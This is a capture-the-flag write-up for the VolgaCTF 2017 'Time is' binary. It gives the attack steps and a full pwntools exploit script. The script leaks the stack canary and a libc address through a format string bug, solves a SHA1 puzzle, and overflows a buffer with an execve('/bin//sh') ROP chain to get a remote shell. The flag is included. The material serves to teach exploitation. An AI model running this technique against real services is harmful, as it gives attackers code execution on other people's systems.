# Time is
##### Volga CTF 2017 (https://quals.2017.volgactf.ru)
```
Exploit 150
Check out an extremelly useful utility at time-is.quals.2017.volgactf.ru:45678
time_is
```

This binary had quite a few steps needed to successfully exploit it. Above all, we were somehow supposed to guess that the server is running `libc6:amd64 2.23-0ubuntu7`. Without this knowledge libc offsets are incorrectly calculated, and the whole exploits fails.

## Steps
* Exploit format string vulnerability to leak stack address and stack canary
* Calculate libc base address using the leaked stack address
* Find payload offset to overwrite stack canary
* Find payload offset to write to stack
* Generate an execve ROP chain rebasing everything from the libc base address
* Exploit buffer overflow vulnerability to:
  * Overwrite stack canary using the leaked value
  * Write ROP chain to the stack
* Quit the program to trigger the exploit
* Additionally, the remote service requires us to solve the following before we can send the payload:
 * `Solve a puzzle: find an x such that 26 last bits of SHA1(x) are set, len(x)==29 and x[:24]=='1ead5924560eb9861e0de6e9'`

## Exploit

```python
from pwn import *
from struct import pack
import sys, itertools, string, hashlib
context(os='linux', arch='amd64')

REMOTE = True
DEBUG = False

def solvePuzzle(p):
    puzzle = p.recvline()
    given = puzzle.split("'")[-2]

    charset = string.letters + string.digits

    print puzzle
    for combo in itertools.product(charset, repeat=5):
        combo = ''.join(combo)
        combo = given + combo
        sha1 = hashlib.sha1(combo)
        sha = sha1.digest()
        if sha[-1] != '\xff' or sha[-2] != '\xff' or sha[-3] != '\xff':
            continue
        control = sha[-4]
        control = ord(control)
        print 'bin control:', control,
        if control & 0b11 != 3:
            print 'fail', sha1.hexdigest()
            continue
        log.info(combo)
        p.sendline(combo)
        break

if REMOTE:
    if DEBUG:
        p = remote('127.0.0.1', 45678)
    else:
        p = remote('time-is.quals.2017.volgactf.ru', 45678)
        solvePuzzle(p)

else:
    p = process('time_is')
    if DEBUG:
        with open('time_is.gdb', 'r') as f:
            gdb.attach(p, exe='time_is', execute=f)

p.recvline() # enter
exploit = '%p.'*267 + '%p' + '%08x' # leak libc and canary
p.sendline(exploit)
leak = p.recvline()
libc = leak.split('.')[5]
libc = int(libc, 16)
libc -= 0x3C84A0 # check /proc/$pid/maps for libc base addr [libc6:amd64 2.23-0ubuntu7]
log.info(hex(libc))
canary = leak.split('.')[-1]
canary = canary.split(':')[0]
canary = canary.replace('0000000000', '00')
canary = int(canary, 16)
log.info(hex(canary))

p.recvline() # enter
canary_offset = 2056
stack_offset = 2120

def rebase(addr):
    return addr + libc

rop = ''
rop += pack('<Q', rebase(0x0000000000001b92)) # pop rdx ; ret
rop += pack('<Q', rebase(0x00000000003c3080)) # @ .data
rop += pack('<Q', rebase(0x0000000000033544)) # pop rax ; ret
rop += '/bin//sh'
rop += pack('<Q', rebase(0x000000000002e19c)) # mov qword ptr [rdx], rax ; ret
rop += pack('<Q', rebase(0x0000000000001b92)) # pop rdx ; ret
rop += pack('<Q', rebase(0x00000000003c3088)) # @ .data + 8
rop += pack('<Q', rebase(0x000000000008ad15)) # xor rax, rax ; ret
rop += pack('<Q', rebase(0x000000000002e19c)) # mov qword ptr [rdx], rax ; ret
rop += pack('<Q', rebase(0x0000000000021102)) # pop rdi ; ret
rop += pack('<Q', rebase(0x00000000003c3080)) # @ .data
rop += pack('<Q', rebase(0x00000000000202e8)) # pop rsi ; ret
rop += pack('<Q', rebase(0x00000000003c3088)) # @ .data + 8
rop += pack('<Q', rebase(0x0000000000001b92)) # pop rdx ; ret
rop += pack('<Q', rebase(0x00000000003c3088)) # @ .data + 8
rop += pack('<Q', rebase(0x000000000008ad15)) # xor rax, rax ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000ab390)) # add rax, 1 ; ret
rop += pack('<Q', rebase(0x00000000000bb7c5)) # syscall ; ret
exploit = (
    p64(canary)*(stack_offset/8) +
    rop +
    '\x0a\x00'
)
p.sendline(exploit)
p.recvline() # exploit ack

p.recvline() # enter
p.sendline('q') # pwn
p.interactive()
p.wait_for_close()

#VolgaCTF{D0nt_u$e_printf_dont_use_C_dont_pr0gr@m}
```
